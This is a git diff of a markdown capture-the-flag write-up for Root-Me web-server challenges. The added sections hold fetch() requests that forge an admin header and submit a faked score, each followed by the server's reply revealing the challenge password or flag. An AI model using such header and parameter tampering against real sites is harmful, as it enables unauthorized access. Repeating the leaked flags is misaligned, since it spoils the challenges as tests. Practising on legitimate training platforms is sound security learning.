@@ -57,10 +57,74 @@ if(isset($_POST["ip"]) && !empty($_POST["ip"])){
 ```
 
 ## Backup file
+* ?? I'm using bfac tool to find out backup file, it doesn't work.
 ## HTTP - Directory Indexing
+* Thus the user can view and download the content of a directory located on a server.
+* Go to /admin/ 
 ## HTTP - Headers
+* You can see "Content is not the only part of an HTTP response!"
+```javascript
+await fetch("http://challenge01.root-me.org/web-serveur/ch5/", {
+    "credentials": "omit",
+    "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:81.0) Gecko/20100101 Firefox/81.0",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+        "Header-RootMe-Admin": "1", // this is keypoint!
+        "Accept-Language": "ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3",
+        "Upgrade-Insecure-Requests": "1",
+        "Cache-Control": "max-age=0"
+    },
+    "method": "GET",
+    "mode": "cors"
+}).then(res=>res.text()).then(console.log);
+```
+```html
+<html>
+<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
+<p>Content is not the only part of an HTTP response!</p>
+<p>You dit it ! You can validate the challenge with the password HeadersMayBeUseful</p></body>
+</html>
+```
 ## HTTP - POST
+* 프록시를 못써서 하는 환상의 똥꼬쇼
+```javascript
+// Example POST method implementation: (by MDN)
+async function postData(url = '', data = '') {
+  // Default options are marked with *
+  const response = await fetch(url, {
+    method: 'POST', // *GET, POST, PUT, DELETE, etc.
+    mode: 'cors', // no-cors, *cors, same-origin
+    cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
+    credentials: 'same-origin', // include, *same-origin, omit
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded'
+    },
+    redirect: 'follow', // manual, *follow, error
+    referrerPolicy: 'no-referrer', // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
+    body: data // body data type must match "Content-Type" header
+  });
+}
+
+postData('http://challenge01.root-me.org/web-serveur/ch56/', 'score=9999999&generate=Give+a+try%21')
+  .then(data => {
+    console.log(data); // JSON data parsed by `data.json()` call
+  });
+```
+```html
+RandGame
+Human vs. Machine
+
+Here is my new game. It's not totally finished but I'm sure nobody can beat me! ;)
+
+    Rules: click on the button to hope to generate a great score
+    Score to beat: 999999
+
+Wow, 9999999! How did you do that? :o
+
+Flag to validate the challenge: H7tp_h4s_N0_s3Cr37S_F0r_y0U
+```
 ## HTTP - Improper redirect
+* 
 ## HTTP - Verb tampering
 ## Install files
 * You know phpBB?
